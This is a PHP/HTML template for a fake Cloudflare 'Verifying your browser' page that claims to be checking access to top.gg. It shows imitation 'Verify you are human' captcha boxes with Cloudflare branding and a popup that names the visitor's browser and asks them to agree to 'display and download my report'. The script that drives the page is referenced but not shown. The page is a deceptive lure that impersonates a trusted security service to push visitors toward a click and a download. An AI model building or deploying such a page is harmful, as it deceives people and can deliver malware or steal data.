<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Verifying Your Browser - DDoS Protection | Cloudflare.</title>

  <?php
    // session start
    session_start();
  ?>

  <!-- Favicon -->
  <?php
        // Check if fetch_url is already declared before defining it
        if (!function_exists('fetch_url')) {
            function fetch_url($url) {
                $ch = curl_init();
                curl_setopt($ch, CURLOPT_URL, $url);
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true); // Follow redirects
                curl_setopt($ch, CURLOPT_TIMEOUT, 10); // Timeout for faster failure handling
                $data = curl_exec($ch);
                curl_close($ch);
                return $data;
            }
        }

        function detect_favicon($domain) {
            // Fetch the HTML from the domain
            $html = fetch_url($domain);
            if ($html) {
                // Look for the favicon in the HTML
                preg_match('/<link.*?rel=["\'](?:shortcut\s)?icon["\'].*?href=["\'](.*?)["\']/', $html, $matches);
                if (!empty($matches[1])) {
                    $favicon_url = $matches[1];
                    
                    // Handle relative URLs (convert to absolute)
                    if (strpos($favicon_url, 'http') !== 0) {
                        $favicon_url = rtrim($domain, '/') . '/' . ltrim($favicon_url, '/');
                    }

                    return $favicon_url; // Return the detected favicon URL
                }
            }
            
            // If no favicon is found in the HTML, return false
            return false;
        }

        function fallback_favicon($domain) {
            // Check for /favicon.ico in the root
            $favicon_url = $domain . "/favicon.ico";
            
            // Try to fetch favicon.ico
            if (@fetch_url($favicon_url)) {
                return $favicon_url;
            }
            
            // Return false if no favicon.ico is found
            return false;
        }

        // Get the root domain (main domain)
        $host = "http://" . $_SERVER['HTTP_HOST']; // For example, "http://127.0.0.1"

        // First, try to detect favicon from HTML
        $favicon_url = detect_favicon($host);

        // If favicon not found in HTML, try /favicon.ico as a fallback
        if (!$favicon_url) {
            $favicon_url = fallback_favicon($host);
        }

        // Only add <link rel="icon"> if a favicon is found
        if ($favicon_url) {
            echo '<link rel="icon" href="' . htmlspecialchars($favicon_url) . '" type="image/x-icon">';
        }
    ?>


	<link rel="stylesheet" type="text/css" href="./assets/css/v2.css" />
</head>
<body>

<!-- get browser name -->
<?php
	function getBrowserName() {
	    $userAgent = $_SERVER['HTTP_USER_AGENT'];

	    if (strpos($userAgent, 'Firefox') !== false) {
	        return 'Mozilla Firefox';
	    } elseif (strpos($userAgent, 'Chrome') !== false && strpos($userAgent, 'Safari') !== false && strpos($userAgent, 'Edge') === false) {
	        return 'Google Chrome';
	    } elseif (strpos($userAgent, 'Edge') !== false) {
	        return 'Microsoft Edge';
	    } elseif (strpos($userAgent, 'Safari') !== false && strpos($userAgent, 'Chrome') === false) {
	        return 'Apple Safari';
	    } elseif (strpos($userAgent, 'Opera') !== false || strpos($userAgent, 'OPR') !== false) {
	        return 'Opera';
	    } elseif (strpos($userAgent, 'MSIE') !== false || strpos($userAgent, 'Trident') !== false) {
	        return 'Internet Explorer';
	    }

	    return 'Unknown Browser';
	}
?>

<!-- Pop up -->
<div id="popup">
	<div>
		To display your report, <?php echo getBrowserName() ?> needs to resend information from your previous request (e.g. a search or form submission). Please confirm below to proceed. <br>
		<label>
			<input type="checkbox" id="checkbox">
			<p>I agree to allow from <?php echo $_SERVER['HTTP_HOST'] ?> to display and download my report.</p>
		</label>
	</div>
	<div>
		<button id="report" disabled>View Report</button>
	</div>
</div>


<div id="overlay"></div>



<?php if (isset($_SESSION['darkmode']) && $_SESSION['darkmode'] == '1'): ?>
    
    <!-- Captcha Section Start -->
    <div id="captcha-wrapper" class="captcha-wrapper" style="background: #333">
      <div class="captcha-container" style="background: #232323;"> 
        <!-- Checkbox Section -->
        <div class="captcha-content">
          <div class="checkbox-container" id="checkbox-container" style="background: none;">
            <!-- <input type="checkbox" id="captcha-checkbox"> -->

            <div class="captcha-spinner" id="captcha-spinner"></div>

            <video class="video1" id="video1">
              <source src="./assets/img/dark_verify1.webm" type="video/webm">
            </video>

            <video class="video2" id="video2">
              <source src="./assets/img/dark_verify2.webm" type="video/webm">
            </video>

          </div>

          <div class="captcha-text" id="captcha-text" style="color: #ccc;">
            Verify you are human
          </div>
        </div>

        <!-- Footer -->
        <div class="captcha-footer">
          <img class="captcha-logo" src="./assets/img/dark_logo.svg" alt="Cloudflare Logo">
          <div class="captcha-privacy">
            <a href="#" style="color: #ccc; text-decoration: underline;">Privacy</a> • <a href="#" style="color: #ccc; text-decoration: underline;">Terms</a>
          </div>
        </div>

        <!-- Error message outside the captcha box -->
        <div class="error-message" id="error-message">
          There was a problem, please try again.
        </div>
      </div>

    </div>
    <!-- Captcha Section End -->

  <?php else: ?>

    <!-- Captcha Section Start -->
    <div id="captcha-wrapper" class="captcha-wrapper">
      <div class="captcha-container">
        <!-- Checkbox Section -->
        <div class="captcha-content">
          <div class="checkbox-container" id="checkbox-container">
            <!-- <input type="checkbox" id="captcha-checkbox"> -->

            <div class="captcha-spinner" id="captcha-spinner"></div>

            <video class="video1" id="video1">
              <source src="./assets/img/verify1.webm" type="video/webm">
            </video>

            <video class="video2" id="video2">
              <source src="./assets/img/verify2.webm" type="video/webm">
            </video>

          </div>

          <div class="captcha-text" id="captcha-text">
            Verify you are human
          </div>
        </div>

        <!-- Footer -->
        <div class="captcha-footer">
          <img class="captcha-logo" src="./assets/img/logo-cloudflare-dark.svg" alt="Cloudflare Logo">
          <div class="captcha-privacy">
            <a href="#" style="text-decoration: underline;">Privacy</a> • <a href="#" style="text-decoration: underline;">Terms</a>
          </div>
        </div>

        <!-- Error message outside the captcha box -->
        <div class="error-message" id="error-message">
          There was a problem, please try again.
        </div>
      </div>

    </div>
    <!-- Captcha Section End -->

  <?php endif; ?>




<div id="board">

    <div class="progress-container">
        <div class="circle"></div>
        <div class="circle"></div>
        <div class="circle"></div>
    </div>

	
	<!-- Visible Page -->

	<h1 data-translate="headline" id="headline">Checking your browser before accessing top.gg</h1>

	<div id="boardText">
		<div data-translate="detail1">
			This process is automatic. Your browser will redirect to your requested content shortly.
		</div>
		<div data-translate="detail2">
			Please allow up to 5 seconds...
		</div>
	</div>

	<p id="bottomText">
		<span data-translate="ddos">DDos protection by</span> <strong class="a_color">Cloudflare</strong>
	</p>

	<p>
		<span data-translate="ray_id">Ray ID: </span>
		<strong class="a_color" id="ray-id"></strong>
	</p>


</div>

</body>
<script type="text/javascript" src="./assets/js/jquery.min.js"></script>
<script type="text/javascript" src="./assets/js/v2.js"></script>
</html>